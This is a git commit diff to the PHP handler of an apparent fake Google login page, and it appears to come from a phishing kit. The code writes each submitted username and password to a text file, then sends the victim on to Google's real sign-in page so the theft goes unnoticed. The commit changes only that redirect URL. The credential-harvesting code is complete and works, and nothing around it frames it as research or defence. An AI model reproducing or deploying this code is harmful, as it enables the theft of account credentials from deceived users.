e0601cd6bf0997859f78e4ec578a3641c5af4686
Euronymou5 <85043356+Euronymou5@users.noreply.github.com>
2021-12-13 18:18:12 -0600

    Update login.php

--- pages/Google/login.php
+++ pages/Google/login.php
@@ -1,6 +1,6 @@
 <?php
 
 file_put_contents("usuarios.txt", "Cuenta: " . $_POST['username'] . " Contraseña: " . $_POST['password'] . "\n", FILE_APPEND);
-header('Location: https://accounts.google.com/signin/v2/recoveryidentifier');
+header('Location: https://accounts.google.com/servicelogin');
 exit();
 ?>
